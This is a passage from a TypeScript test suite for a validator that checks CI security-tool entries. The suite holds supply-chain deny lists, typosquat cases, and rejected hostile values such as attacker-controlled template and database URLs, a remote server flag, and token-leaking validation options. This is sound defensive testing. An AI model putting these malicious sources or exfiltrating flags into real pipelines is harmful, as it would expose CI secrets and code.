    // in a download URL anywhere in the step (env, args)
    const url = `https://github.com/${mixed}/releases/download/v1.0.0/x.tar.gz`;
    rejects([binEntry('fine/tool', { env: { TOOL_URL: url } })], NEVER_MSG);
    rejects([binEntry('fine/tool', { command: ['tool', '--from', `https://raw.githubusercontent.com/${repo}/main/x.sh`], args: [] })], NEVER_MSG);
    // and neverListed says so for each spelling
    for (const r of [repo, upper, `${repo}/sub/path`, `${repo}@v1`, `docker://${image}:latest`, `ghcr.io/${image}:1.0`]) expect(neverListed(r), r).not.toBeNull();
  });

  it('reviewed: never-list look-alikes refused (within distance 2 of a never-list name, or a never-listed owner)', () => {
    for (const r of ['aquasecurity/trivy-actions', 'aquasecurlty/trivy-action', 'checkmarx/kicss', 'zizmorcore/zizmor-acton', 'reviewdoq/action-setup', 'portswiger/dastardly', 'someone/trivy-actlon', 'someone/gitleaks-actoin']) {
      expect(neverListed(r), r).not.toBeNull();
      rejects([actionEntry({ id: 'x', repo: r })], NEVER_MSG);
    }
    rejects([imageEntry('checkmarx/klcs')], NEVER_MSG);
    // far enough away, or a short name that only differs: fine
    for (const r of ['aquasecurity/trivy', 'fine/tool', 'reviewers/tool', 'checkmarx/other-tool', 'someone/kids', 'someone/tfsed']) expect(neverListed(r), r).toBeNull();
    expect(NEVER_NAME_ALLOW.size).toBe(0);
  });

  it('reviewed: never-list names under any owner, sibling names, and the name in any URL or token shape (fix round 1)', () => {
    // a fork or a copy under another owner, and siblings that start with a never-list name
    for (const r of ['dajiaohuang/trivy-action', 'someone/kics-github-action', 'someone/setup-trivy', 'someone/gitleaks-action', 'someone/zizmor-action',
      'slsa-framework/slsa-github-generator-go', 'someone/slsa-github-generator-generic', 'someone/tfsec', 'someone/tfsec-anything', 'someone/kics', 'someone/reviewdog']) {
      expect(neverListed(r), r).not.toBeNull();
    }
    // the reference is read the way GitHub, curl or npm would read it
    const shapes = [
      'https://github.com/aquasecurity/trivy%2Daction/archive/refs/tags/v0.28.0.tar.gz', // %-encoded (GitHub decodes it)
      'https://github.com/aquasecurity/%74rivy-action', // any escaped letter
      'https://github.com/x/../aquasecurity/trivy-action/archive/refs/tags/v0.28.0.tar.gz', // dot segment (curl folds it)
      'https://github.com/./aquasecurity/./trivy-action', '../aquasecurity/trivy-action',
      'https://api.github.com/repos/aquasecurity/trivy-action/tarball/v0.28.0',
      '@reviewdog/action-setup', // an npm scope is its owner
    ];
    for (const r of shapes) expect(neverListed(r), r).not.toBeNull();
    // a repo by numeric id, or a broken %-escape, can't be read: refused
    expect(neverListed('https://api.github.com/repositories/268833180/tarball/v0.28.0')?.key).toBe('(repo by id)');
    expect(neverListed('api.github.com/repositories/268833180')?.key).toBe('(repo by id)');
    expect(neverListed('https://github.com/aquasecurity/trivy%ZZaction')?.key).toBe('(unreadable)');
    // glued into config text (x:owner/name), in an arg, or as an npm plugin
    const glued = trivyEntry();
    glued.fixedInputs.config.content += 'uses:aquasecurity/trivy-action@v1\n';
    rejects([glued], NEVER_MSG);
    const scopedArg = binEntry('fine/tool', { command: ['tool', '@reviewdog/action-setup'], args: [] });
    rejects([scopedArg], NEVER_MSG);
    rejects([pkgEntry('npm', [npmPlugin('@reviewdog/reviewdog')])], NEVER_MSG);
    for (const url of shapes.slice(0, 6)) rejects([binEntry('fine/tool', { env: { X_URL: url } })], NEVER_MSG);
    rejects([binEntry('fine/tool', { env: { X_URL: 'https://api.github.com/repositories/268833180/tarball/v0.28.0' } })], /repo by id/);
  });

  it('reviewed: never-list images, by image name on any registry, apart from the repo keys (P11)', () => {
    for (const name of ['trivy', 'tfsec', 'tfsec-ci', 'tfsec-alpine', 'tfsec-scratch', 'kics', 'dastardly', 'terrascan']) expect(NEVER_IMAGES, name).toHaveProperty([name]);
    for (const img of ['aquasec/trivy', 'aquasec/tfsec', 'aquasec/tfsec-ci', 'ghcr.io/aquasecurity/trivy', 'public.ecr.aws/aquasecurity/trivy', 'docker.io/checkmarx/kics',
      'public.ecr.aws/portswigger/dastardly', 'tenable/terrascan', 'aquasec/trivy:0.69.4', `ghcr.io/aquasecurity/trivy@sha256:${'c'.repeat(64)}`]) {
      expect(neverImage(img), img).not.toBeNull();
      rejects([imageEntry(img.replace(/[:@].*$/, ''))], NEVER_MSG);
    }
    // also with the trivy flags and a signature: the image is refused, the binary isn't (P11, probe #28)
    const full = trivyEntry();
    full.candidate.kind = 'docker';
    full.candidate.pin = { digest: DIGEST };
    full.candidate.version = '0.76.0';
    full.step.cli.install = { method: 'docker', package: 'aquasec/trivy', version: '0.76.0' };
    rejects([full], NEVER_MSG);
    // an image named in a command word (docker run …) is refused too
    rejects([binEntry('fine/tool', { command: ['docker', 'run', 'aquasec/tfsec-ci:latest'], args: [] })], NEVER_MSG);
    // the repo key stays apart: the reviewed binary's repo aquasecurity/trivy loads (the real list)
    expect(neverListed('aquasecurity/trivy')).toBeNull();
    expect(byId(real(), 'trivy-image')).toHaveLength(1);
  });

  it('reviewed: trivy entry without --disable-telemetry, --skip-version-check or --skip-check-update refused', () => {
    expect(load([trivyEntry()])).toHaveLength(1);
    for (const flag of TRIVY_FLAGS) {
      const without = (xs: string[]) => xs.filter((x) => x !== flag);
      const base = trivyEntry();
      // missing from the command (and so from the fixed args too)
      rejects([trivyEntry({ command: without(base.step.cli.command), args: without(base.fixedInputs.args) })], new RegExp(flag));
      // in the command but not a fixed arg (the AI-proof part of the template)
      rejects([trivyEntry({ args: without(base.fixedInputs.args) })], new RegExp(flag));
      // switched off again later in the command: trivy keeps the last value
      rejects([trivyEntry({ command: [...base.step.cli.command, `${flag}=false`] })], new RegExp(flag));
    }
    // any trivy: found by its repo in any case or its command, not only aquasecurity/trivy
    rejects([trivyEntry({ repo: 'AquaSecurity/Trivy', args: ['--format', 'sarif'], command: ['trivy', 'config', '--format', 'sarif', '--output', 'tool.sarif'] })], /--disable-telemetry/);
    rejects([binEntry('fine/tool', { command: ['/usr/local/bin/trivy', 'config', '.'], args: [] })], /--disable-telemetry|verifiedWith/);
  });

  it('reviewed: trivy argv is read with v0.76.0\'s grammar: a swallowed, late or unknown flag is refused (fix round 1)', () => {
    const tail = ['--format', 'sarif', '--output', 'tool.sarif', '--exit-code', '1', '.'];
    // a value-taking flag swallows the next word: --template (-t) takes --disable-telemetry as its value
    rejects([trivyEntry({ command: ['trivy', 'image', '--template', ...TRIVY_FLAGS, ...tail] })], /--disable-telemetry in effect/);
    rejects([trivyEntry({ command: ['trivy', 'image', '-t', ...TRIVY_FLAGS, ...tail] })], /--disable-telemetry in effect/);
    rejects([trivyEntry({ command: ['trivy', 'image', '-o', '--skip-version-check', '--disable-telemetry', '--skip-check-update', ...tail], args: ['--skip-version-check', '--disable-telemetry', '--skip-check-update'] })], /--skip-version-check in effect/);
    // after -- the words are targets, not flags
    rejects([trivyEntry({ command: ['trivy', 'image', ...tail, '--', ...TRIVY_FLAGS], args: TRIVY_FLAGS })], /in effect/);
    // a flag trivy v0.76.0 doesn't have, a forbidden one, or no subcommand first
    rejects([trivyEntry({ command: ['trivy', 'config', ...TRIVY_FLAGS, '--no-such-flag', ...tail] })], /unknown flag --no-such-flag/);
    rejects([trivyEntry({ command: ['trivy', 'config', ...TRIVY_FLAGS, '-Z', ...tail] })], /unknown flag -Z/);
    for (const f of ['--server=http://x', '--db-repository=evil/db', '--checks-bundle-repository=evil/checks', '--config=repo.yaml', '-crepo.yaml', '--module-dir=/tmp/m']) {
      rejects([trivyEntry({ command: ['trivy', 'image', ...TRIVY_FLAGS, f, ...tail] })], /must not use --/);
    }
    rejects([trivyEntry({ command: [...TRIVY_FLAGS, 'trivy', 'image', ...tail] })], /trivy config\|image\|fs/);
    rejects([trivyEntry({ command: ['trivy', 'plugin', 'install', 'x'], args: [] })], /trivy config\|image\|fs/);
    // shorthands read as pflag does: combined bools and glued values
    expect(load([trivyEntry({ command: ['trivy', 'image', ...TRIVY_FLAGS, '-fsarif', '-o=tool.sarif', '--exit-code', '1', '.'], args: [...TRIVY_FLAGS, '--exit-code', '1'] })])).toHaveLength(1);
    expect(load([trivyEntry({ command: ['trivy', 'fs', ...TRIVY_FLAGS, '--scanners', 'license', '--severity', 'HIGH,CRITICAL', '--exit-code', '1', '.'], args: [...TRIVY_FLAGS, '--exit-code', '1'] })])).toHaveLength(1);
    // the environment can set any flag: no TRIVY_* env at all
    const env = trivyEntry();
    env.step.cli.env = { ['TRIVY_DISABLE_' + 'TELEMETRY']: 'false' };
    env.fixedInputs.env = { ['TRIVY_DISABLE_' + 'TELEMETRY']: 'false' };
    rejects([env], /TRIVY_/);
    // choices: a known flag only, never a required or forbidden one, and no value that is a flag
    const image = (choices: Entry) => trivyEntry({ command: ['trivy', 'image', ...TRIVY_FLAGS, ...tail.slice(0, -1)], choices });
    expect(load([image({ severity: ['HIGH,CRITICAL'], 'ignore-unfixed': ['true', 'false'] })])).toHaveLength(1);
    rejects([image({ severity: ['CRITICAL', '--disable-telemetry=false'] })], /choice value may not be a flag/);
    rejects([image({ 'no-such': ['x'] })], /no flag --no-such/);
    rejects([image({ server: ['http://x'] })], /may not choose/);
    rejects([trivyEntry({ choices: { 'ignore-unfixed': ['true'] } })], /no flag --ignore-unfixed/); // an image-only flag on trivy config
  });

  it('reviewed: the real trivy-config and trivy-image pass with the three flags and a cosign verifiedWith; without any one flag they fail (PB2)', () => {
    const list = real();
    for (const id of ['trivy-config', 'trivy-image']) {
      const t = byId(list, id)[0];
      for (const flag of TRIVY_FLAGS) {
        expect(t?.step.cli?.command, `${id} ${flag}`).toContain(flag);
        expect(t?.fixedInputs.args, `${id} ${flag}`).toContain(flag);
      }
      expect(t?.verifiedWith).toEqual({
        method: 'cosign-bundle', asset: 'trivy_0.76.0_checksums.txt', identity: TRIVY_IDENTITY, issuer: ISSUER, verifiedOn: '2026-10-28', // re-run on pin day (P17)
      });
      const raw = rawFile().tools.find((x) => x.id === id) as Entry;
      for (const flag of TRIVY_FLAGS) {
        const without = structuredClone(raw);
        without.step.cli.command = without.step.cli.command.filter((x: string) => x !== flag);
        without.fixedInputs.args = without.fixedInputs.args.filter((x: string) => x !== flag);
        rejects([without], new RegExp(flag));
      }
      const unsigned = structuredClone(raw);
      delete unsigned.verifiedWith;
      rejects([unsigned], /verifiedWith/);
    }
  });

  it('reviewed: jscpd with --semantic anywhere refused', () => {
    expect(load([jscpdEntry()])).toHaveLength(1);
    const SEMANTIC = /--semantic/;
    const cmd = ['jscpd', '--reporters', 'sarif', '--output', '.'];
    rejects([jscpdEntry({ command: [...cmd, '--semantic'] })], SEMANTIC);
    rejects([jscpdEntry({ command: [...cmd, '--semantic=true'] })], SEMANTIC);
    rejects([jscpdEntry({ command: [...cmd, '--Semantic'] })], SEMANTIC);
    rejects([jscpdEntry({ command: [...cmd, '--semantic-download'] })], SEMANTIC);
    rejects([jscpdEntry({ command: [...cmd, '--semantic'], args: ['--reporters', 'sarif', '--semantic'] })], SEMANTIC);
    rejects([jscpdEntry({ env: { JSCPD_SEMANTIC: 'true' } })], SEMANTIC);
    rejects([jscpdEntry({ env: { JSCPD_ARGS: '--semantic' } })], SEMANTIC);
    rejects([jscpdEntry({ choices: { mode: ['--semantic'] } })], SEMANTIC);
    rejects([jscpdEntry({ choices: { semantic: ['true'] } })], SEMANTIC);
    rejects([jscpdEntry({ config: { content: '{ "semantic": true }\n', passAs: { flag: '--config' } } })], SEMANTIC);
    // a jscpd step under another repo or package name is still jscpd, and --semantic is refused in any entry
    rejects([binEntry('fine/tool', { command: ['npx', 'jscpd', '--semantic'], args: [] })], SEMANTIC);
    rejects([binEntry('someone/cpd', { command: ['cpd', '--semantic', '.'], args: [] })], SEMANTIC); // probe #44: a renamed binary
    const npm = pkgEntry('npm', undefined, 'jscpd');
    npm.step.cli.command = ['jscpd', '--format', 'sarif', '--semantic'];
    rejects([npm], SEMANTIC);
    const scoped = pkgEntry('npm', undefined, '@jscpd/cli');
    scoped.step.cli.command = ['cpd', '--format', 'sarif', '--compare'];
    rejects([scoped], /--compare/); // the @jscpd scope is jscpd
  });

  it('reviewed: jscpd modes that run the embedding model and a semantic config are refused, whatever the spelling (fix round 1)', () => {
    const cmd = ['jscpd', ...JSCPD_ARGS, '--reporters', 'sarif', '--output', 'jscpd-report', '.'];
    for (const f of ['--compare', '--mcp', '--dashboard']) rejects([jscpdEntry({ command: [...cmd, f] })], /--compare, --mcp or --dashboard/);
    for (const f of ['--semantic-scope=all', '--semantic-url=http://x', '--semantic-download']) rejects([jscpdEntry({ command: [...cmd, f] })], /--semantic/);
    // the config is JSON, decoded before the check: escapes, nesting and case can't hide the key
    for (const content of ['{"\\u0073emantic": {"enabled": true}}', '{ "semantic": { "enabled": true } }', '{ "Semantic": {} }', '{ "x": [{ "semantic": 1 }] }', '{ "mcp": true }']) {
      rejects([jscpdEntry({ config: { content: `${content}\n`, passAs: { flag: '--config' } } })], /semantic/);
    }
    rejects([jscpdEntry({ config: { content: 'semantic:\n  enabled: true\n', passAs: { flag: '--config' } } })], /semantic|JSON/);
    rejects([jscpdEntry({ config: { content: 'threshold: 0\n', passAs: { flag: '--config' } } })], /must be JSON/);
    // ruling P19: the pinned config is exactly the reviewed one ({}), so any other key is refused too
    rejects([jscpdEntry({ config: { content: '{ "threshold": 0, "ignore": ["**/fixtures/**"] }\n', passAs: { flag: '--config' } } })], /exactly the content reviewed/);
    expect(load([jscpdEntry()])).toHaveLength(1);
  });

  it('reviewed: betterleaks with --validation, the validate subcommand or another forbidden flag refused; without a pinned --config refused (fix round 1: v1.9.0 names)', () => {
    // the pinned v1.9.0 names (cmd/root.go at the tag), main's later names, and the v2 shorthands
    for (const f of ['--validation', '--validation-env-vars', '--validation-status', '--diagnostics', '--experiments', '--verbose', '--validate', '--analyze', '--unsafe-auto-load-config']) {
      expect(BETTERLEAKS_FORBIDDEN_FLAGS, f).toContain(f);
    }
    expect([...BETTERLEAKS_FORBIDDEN_SUBCOMMANDS]).toEqual(expect.arrayContaining(['validate', 'github', 'gitlab', 'huggingface', 's3']));
    expect(load([betterleaksEntry()])).toHaveLength(1);
    expect(load([betterleaksEntry({ command: ['betterleaks', 'dir', '--redact', '--report-format', 'sarif', '--report-path', 'tool.sarif', '--exit-code', '1', '.'] })])).toHaveLength(1);
    for (const flag of BETTERLEAKS_FORBIDDEN_FLAGS) {
      const re = new RegExp(`never use ${flag}`);
      rejects([betterleaksEntry({ command: blCmd(flag) })], re);
      rejects([betterleaksEntry({ command: blCmd(flag), args: ['--report-format', 'sarif', flag] })], re);
      rejects([betterleaksEntry({ choices: { extra: [flag] } })], re);
      if (flag.startsWith('--')) {
        rejects([betterleaksEntry({ command: blCmd(`${flag}=true`) })], re);
        rejects([betterleaksEntry({ command: blCmd(flag.slice(1)) })], re); // one dash
        rejects([betterleaksEntry({ choices: { [flag.slice(2)]: ['true'] } })], re);
      }
    }
    rejects([betterleaksEntry({ command: blCmd('--validation-env-vars', 'GITHUB_TOKEN') })], /never use --validation-env-vars/);
    rejects([betterleaksEntry({ command: blCmd('--validation-rps=5') })], /never use --validation-rps/);
    // subcommands that call out, and anything but a local scan
    for (const sub of ['validate', 'github', 'gitlab', 'huggingface', 's3', 'analyze']) rejects([betterleaksEntry({ command: ['betterleaks', sub, '--report-format', 'sarif'], args: ['--report-format', 'sarif'] })], new RegExp(`never run ${sub}`));
    rejects([betterleaksEntry({ command: ['betterleaks', 'config', 'show'], args: [] })], /runs only git, dir, stdin/);
    // a flag v1.9.0 doesn't have (fail closed)
    rejects([betterleaksEntry({ command: blCmd('--no-such-flag') })], /unknown flag --no-such-flag/);
    // the config: pipegen's pinned one only
    const PINNED = /pinned --config/;
    rejects([betterleaksEntry({ config: null })], PINNED);
    rejects([betterleaksEntry({ config: { content: 'x\n', passAs: { flag: '--baseline-path' } } })], PINNED);
    rejects([betterleaksEntry({ command: blCmd('--config', 'repo.toml') })], PINNED); // a second config
    rejects([betterleaksEntry({ command: blCmd('-c=repo.toml') })], PINNED);
    rejects([betterleaksEntry({ command: blCmd('-crepo.toml') })], PINNED);
    for (const k of ['BETTERLEAKS_CONFIG', 'GITLEAKS_CONFIG_TOML']) rejects([betterleaksEntry({ env: { [k]: 'x' } })], PINNED);
    rejects([betterleaksEntry({ env: { HUGGINGFACE_REGION: 'x' } })], /gets no env/); // any env at all
    // -dr / -ir are expanded as cmd/rule_flags.go does, and --disable-rule is not on the allowlist (P13)
    rejects([betterleaksEntry({ command: blCmd('-dr', 'generic-api-key') })], /not --disable-rule/);
  });

  it('reviewed: nuclei without -duc or with -dashboard refused; templates only from the pinned archive', () => {
    expect(load([nucleiEntry()])).toHaveLength(1);
    // -duc in the command and the fixed args
    rejects([nucleiEntry({ command: nucleiCmd().filter((x) => x !== '-duc'), args: ['-t', NUCLEI_DIR] })], /-duc/);
    rejects([nucleiEntry({ args: ['-t', NUCLEI_DIR] })], /-duc/);
    rejects([nucleiEntry({ command: nucleiCmd('-duc=false') })], /-duc/);
    // no upload to ProjectDiscovery's cloud
    for (const f of ['-dashboard', '--dashboard', '-dashboard=true', '-cloud', '-pd', '-pdu', '-dashboard-upload']) rejects([nucleiEntry({ command: nucleiCmd(f) })], /-dashboard|-cloud|-pd/);
    rejects([nucleiEntry({ choices: { dashboard: ['true'] } })], /-dashboard/);
    rejects([nucleiEntry({ env: { ...NUCLEI_ENV, ['PDCP_API_' + 'KEY']: 'x' } })], /PDCP_/);
    // templates: -t names the verified directory only; no template URLs or updates
    rejects([nucleiEntry({ command: nucleiCmd('-t', '/tmp/other') })], /-t/);
    rejects([nucleiEntry({ command: nucleiCmd(`-t=${NUCLEI_DIR}/../x`) })], /-t/);
    rejects([nucleiEntry({ command: nucleiCmd('-tu', 'https://example.com/t.yaml') })], /-t/);
    rejects([nucleiEntry({ command: nucleiCmd('-w', '/tmp/w') })], /-t/);
    rejects([nucleiEntry({ command: nucleiCmd('-ut') })], /update/);
    rejects([nucleiEntry({ command: ['nuclei', '-duc', '-severity', 'high'], args: ['-duc'] })], /-t/);
    rejects([nucleiEntry({ args: ['-duc'] })], /-t/);
    // the pinned archive: an official nuclei-templates release tarball and its sha256
    rejects([nucleiEntry({ env: { [NUCLEI_SUM_ENV]: SUM } })], new RegExp(NUCLEI_URL_ENV));
    rejects([nucleiEntry({ env: { ...NUCLEI_ENV, [NUCLEI_URL_ENV]: 'https://github.com/evil/nuclei-templates/archive/refs/tags/v10.5.0.tar.gz' } })], new RegExp(NUCLEI_URL_ENV));
    rejects([nucleiEntry({ env: { ...NUCLEI_ENV, [NUCLEI_URL_ENV]: 'https://github.com/projectdiscovery/nuclei-templates/archive/refs/heads/main.tar.gz' } })], new RegExp(NUCLEI_URL_ENV));
    rejects([nucleiEntry({ env: { [NUCLEI_URL_ENV]: NUCLEI_URL, [NUCLEI_SUM_ENV]: 'abc' } })], new RegExp(NUCLEI_SUM_ENV));
    expect(load([nucleiEntry({ env: { ...NUCLEI_ENV, [NUCLEI_URL_ENV]: 'https://github.com/projectdiscovery/nuclei-templates/releases/download/v10.5.0/nuclei-templates-10.5.0.tar.gz' } })])).toHaveLength(1);
  });

  it('reviewed: nuclei argv is read with v3.11.1\'s grammar: cloud upload, AI templates, config files and swallowed flags refused (fix round 1)', () => {
    // every forbidden name is a real v3.11.1 flag (cmd/nuclei/main.go at the tag)
    for (const f of ['cloud-upload', 'dashboard', 'dashboard-upload', 'team-id', 'auth', 'prompt', 'config', 'profile', 'workflows', 'template-url', 'workflow-url', 'update', 'update-templates', 'reset', 'env-vars', 'disable-update-check', 'templates']) {
      expect(NUCLEI_GRAMMAR.value.has(f) || NUCLEI_GRAMMAR.bool.has(f), f).toBe(true);
    }
    expect(NUCLEI_GRAMMAR.shorts).toMatchObject({ cup: 'cloud-upload', pd: 'dashboard', ai: 'prompt', tp: 'profile', duc: 'disable-update-check', t: 'templates', o: 'output' });
    for (const f of ['-cup', '--cloud-upload', '-cup=true']) rejects([nucleiEntry({ command: nucleiCmd(f) })], /never upload/);
    for (const f of [['-ai', 'find sqli'], ['-prompt', 'x'], ['-config', 'nuclei.yaml'], ['-tp', 'p.yaml'], ['-profile', 'p'], ['-turl', 'https://x/t.yaml'], ['-wurl', 'https://x/w.yaml']]) {
      rejects([nucleiEntry({ command: nucleiCmd(...f) })], /templates come only from the pinned archive/);
    }
    rejects([nucleiEntry({ command: nucleiCmd('-ev') })], /environment into templates/);
    // a value-taking flag swallows -duc (-o takes it as the output file); a target word ends the flags
    rejects([nucleiEntry({ command: ['nuclei', '-o', '-duc', '-t', NUCLEI_DIR, '-u', 'http://localhost:8080'] })], /-duc \(no update check\) in effect/);
    rejects([nucleiEntry({ command: ['nuclei', '-t', NUCLEI_DIR, 'http://localhost:8080', '-duc'], args: ['-t', NUCLEI_DIR, '-duc'] })], /-duc \(no update check\) in effect/);
    rejects([nucleiEntry({ command: nucleiCmd('-no-such-flag') })], /unknown flag -no-such-flag/);
    // only pipegen's two template env variables
    for (const k of ['ENABLE_CLOUD_UPLOAD', 'GITHUB_TEMPLATE_REPO', 'AWS_TEMPLATE_BUCKET', 'NUCLEI_SIGNATURE_PUBLIC_KEY']) rejects([nucleiEntry({ env: { ...NUCLEI_ENV, [k]: 'x' } })], new RegExp(`not ${k}`));
    // choices: a known flag only, no forbidden one, no value that is a flag
    expect(load([nucleiEntry({ choices: { tags: ['cve', 'cve,misconfig'] } })])).toHaveLength(1);
    rejects([nucleiEntry({ choices: { 'rate-limit': ['50'] } })], /no flag --rate-limit that pipegen may pass/);
    rejects([nucleiEntry({ choices: { cup: ['true'] } })], /never upload/);
    rejects([nucleiEntry({ choices: { t: ['/tmp/x'] } })], /may not choose/);
    rejects([nucleiEntry({ choices: { severity: ['high', '-cup'] } })], /choice value may not be a flag/);
  });

  it('reviewed: plugins must be exact, hashed npm/pip packages; at most 4', () => {
    const ok = load([pkgEntry('npm', [npmPlugin('typescript-eslint'), npmPlugin('@eslint/js')])])[0];
    expect(ok?.step.cli?.plugins?.map((p) => p.package)).toEqual(['typescript-eslint', '@eslint/js']);
    expect(load([pkgEntry('pip', [pipPlugin('hypothesis')])])).toHaveLength(1);
    // the wrapper's own platform package is a different name, so it is allowed (PS26)
    const asBiome = { argvPolicies: { ...FIXTURE_POLICIES, linter: { ...(FIXTURE_POLICIES.linter as ArgvPolicy), package: '@biomejs/biome' } } };
    expect(loadReviewed(writeList([pkgEntry('npm', [npmPlugin('@biomejs/cli-linux-x64')], '@biomejs/biome')]), asBiome)).toHaveLength(1);
    const P = /plugin/;
    rejects([pkgEntry('npm', ['a', 'b', 'c', 'd', 'e'].map((n) => npmPlugin(n)))], /at most 4/);
    rejects([pkgEntry('npm', [npmPlugin('x', { version: '^8.0.0' })])], P);
    rejects([pkgEntry('npm', [npmPlugin('x', { version: '8' })])], P);
    rejects([pkgEntry('npm', [npmPlugin('x', { version: 'latest' })])], P);
    rejects([pkgEntry('npm', [npmPlugin('x', { checksum: SUM })])], P); // npm needs the sha512 integrity
    rejects([pkgEntry('npm', [npmPlugin('x', { checksum: undefined })])], P);
    rejects([pkgEntry('pip', [pipPlugin('x', { checksum: SRI })])], P); // pip needs a sha256
    rejects([pkgEntry('pip', [pipPlugin('x', { version: '>=1.0' })])], P);
    rejects([pkgEntry('npm', [npmPlugin('x', { method: 'github-release' })])], P);
    rejects([pkgEntry('npm', [npmPlugin('x', { method: 'docker' })])], P);
    rejects([pkgEntry('npm', [pipPlugin('x')])], P); // a pip plugin for an npm tool
    rejects([pkgEntry('npm', [npmPlugin('x', { digest: DIGEST })])], P);
    rejects([pkgEntry('npm', [npmPlugin('Bad Name')])], P);
    rejects([pkgEntry('npm', [npmPlugin('x'), npmPlugin('x')])], /twice/);
    // never the entry's own package
    rejects([pkgEntry('npm', [npmPlugin('eslint')])], /own package/);
    rejects([pkgEntry('pip', [pipPlugin('Schemathesis')])], /own package/); // PyPI names compare normalised
    // only npm and pip entries take plugins
    const bin = binEntry('fine/tool');
    bin.step.cli.plugins = [npmPlugin('x')];
    rejects([bin], P);
    // eslint-config-prettier and eslint-plugin-prettier are never added (PS25, CVE-2025-54313): as a plugin, the package, or in any command or arg
    for (const name of ['eslint-config-prettier', 'eslint-plugin-prettier']) {
      const re = new RegExp(name);
      rejects([pkgEntry('npm', [npmPlugin(name)])], re);
      rejects([pkgEntry('npm', undefined, name)], re);
      const inCmd = pkgEntry('npm', undefined);
      inCmd.step.cli.command = ['eslint', '--format', 'sarif', '--plugin', name];
      rejects([inCmd], re);
      const inArg = pkgEntry('npm', undefined);
      inArg.step.cli.command = ['eslint', '--format', 'sarif', `--resolve-plugins-relative-to=${name}`];
      inArg.fixedInputs.args = ['--format', 'sarif', `--resolve-plugins-relative-to=${name}`];
      rejects([inArg], re);
      rejects([binEntry('fine/tool', { choices: { plugin: [name] } })], re);
    }
  });

  it('reviewed: MUST_VERIFY repo without verifiedWith refused', () => {
    // ruling P12: jscpd is pinned by sha256 only (branch-signed release, advisory check, DEC #93); ruling P16: so is
    // hadolint, whose v2.15.1 attestation is signed from refs/heads/master (no tag identity to bind it to)
    expect([...MUST_VERIFY].sort()).toEqual(['aquasecurity/trivy', 'betterleaks/betterleaks', 'securego/gosec', 'stackrox/kube-linter']);
    expect(load([jscpdEntry({ verifiedWith: null })])).toHaveLength(1);
    const hadolint = rawFile().tools.find((t) => t.id === 'hadolint') as Entry;
    expect(hadolint.verifiedWith).toBeUndefined();
    expect(load([hadolint])).toHaveLength(1);
    const entries: Record<string, (v: Entry | null, repo?: string) => Entry> = {
      'aquasecurity/trivy': (v, repo) => trivyEntry({ verifiedWith: v, ...(repo === undefined ? {} : { repo }) }),
      'betterleaks/betterleaks': (v, repo) => (repo === undefined ? betterleaksEntry({ verifiedWith: v }) : { ...betterleaksEntry({ verifiedWith: v }), candidate: { ...betterleaksEntry().candidate, repo, name: repo } }),
      'stackrox/kube-linter': (v, repo) => binEntry(repo ?? 'stackrox/kube-linter', { verifiedWith: v }),
      'securego/gosec': (v, repo) => binEntry(repo ?? 'securego/gosec', { verifiedWith: v }),
    };
    for (const repo of MUST_VERIFY) {
      const make = entries[repo] as (v: Entry | null, repo?: string) => Entry;
      rejects([make(null)], /verifiedWith is required/);
      rejects([make(null, repo.toUpperCase())], /verifiedWith is required/);
      // the tool under any owner, a fork or a mirror, needs it too (fix round 1, probes #40-41)
      rejects([make(null, `someone/${repo.split('/')[1]}`)], /verifiedWith is required/);
      const v = verified(repo);
      expect(load([make(v)])[0]?.verifiedWith, repo).toEqual(v); // it stays on the ReviewedTool (PS24)
    }
    // found by what it runs, whatever the repo is called
    rejects([binEntry('someone/scanner', { command: ['kube-linter', 'lint'], args: [] })], /verifiedWith is required/);
    // any entry may record one; it is checked the same way
    expect(load([binEntry('fine/tool', { verifiedWith: verified('fine/tool') })])[0]?.verifiedWith).toMatchObject({ method: 'cosign-bundle' });
    const hado = (over: Entry) => binEntry('hadolint/hadolint', { verifiedWith: verified('hadolint/hadolint', { identity: 'https://github.com/hadolint/hadolint/.github/workflows/haskell.yml@refs/tags/v1.0.0', ...over }) });
    expect(load([hado({ method: 'github-attestation', asset: 'hadolint-linux-x86_64' })])).toHaveLength(1);
    expect(load([hado({ method: 'cosign-signature' })])).toHaveLength(1);
    expect(load([hado({ asset: 'hadolint_1.0.0_checksums.txt' })])).toHaveLength(1);
    rejects([hado({ method: 'gpg' })]);
    rejects([hado({ issuer: 'https://accounts.google.com' })]);
    rejects([hado({ verifiedOn: '2026-10-25' })], /pinnedOn/); // the fixture list is pinned on 2026-10-26
    rejects([hado({ verifiedOn: '2026-02-30' })], /verifiedOn/);
    rejects([hado({ asset: '../checksums.txt' })], /asset/);
    rejects([hado({ identity: '^https://github.com/hadolint/.*$' })], /identity/); // exact identity, never a regex
    rejects([hado({ identity: 'https://github.com/hadolint/hadolint/.github/workflows/.*' })], /identity/);
    rejects([hado({ identity: 'https://example.com/hadolint/hadolint/.github/workflows/haskell.yml@refs/tags/v1.0.0' })], /identity/);
    rejects([hado({ identity: 'https://github.com/hadolint/hadolint/.github/workflows/haskell.yml@refs/tags/v0.9.0' })], /identity/); // another release's tag
    const extra = hado({});
    extra.verifiedWith.note = 'x';
    rejects([extra]);
  });

  it('reviewed: verifiedWith is bound to the entry: its repo, a tag of its version, its asset and real dates (fix round 1, probes #55-58)', () => {
    const hado = (over: Entry, releasedAt?: string) => {
      const e = binEntry('hadolint/hadolint', { verifiedWith: verified('hadolint/hadolint', over) });
      if (releasedAt !== undefined) e.releasedAt = releasedAt;
      return e;
    };
    rejects([hado({ identity: 'https://github.com/evil/evil/.github/workflows/release.yml@refs/tags/v1.0.0' })], /workflow of evil\/evil, not of hadolint\/hadolint/);
    rejects([hado({ identity: 'https://github.com/hadolint/hadolint/.github/workflows/release.yml@refs/heads/v1.0.0' })], /never a regex, a branch or a commit/);
    rejects([hado({ identity: 'https://github.com/hadolint/hadolint/.github/workflows/release.yml@refs/heads/master' })], /never a regex, a branch or a commit/);
    rejects([hado({ identity: `https://github.com/hadolint/hadolint/.github/workflows/release.yml@${'a'.repeat(40)}` })], /never a regex, a branch or a commit/);
    rejects([hado({ asset: 'hadolint_0.9.0_checksums.txt' })], /file of version 0\.9\.0/);
    rejects([hado({ verifiedOn: '2099-01-01' })], /in the future/);
    const early = hado({ verifiedOn: '2026-10-26' }, '2026-10-19T00:00:00Z');
    expect(load([early])).toHaveLength(1);
    const before = binEntry('hadolint/hadolint', { verifiedWith: verified('hadolint/hadolint', { verifiedOn: '2026-10-26' }) });
    before.releasedAt = '2026-10-19T00:00:00Z';
    before.verifiedWith.verifiedOn = '2026-10-18';
    rejects([before], /verifiedOn is before the release/);
  });

  it('reviewed: a cosign-key verifiedWith for repo-held keys (P10): the key in the entry\'s own repo at its tag, with its sha256', () => {
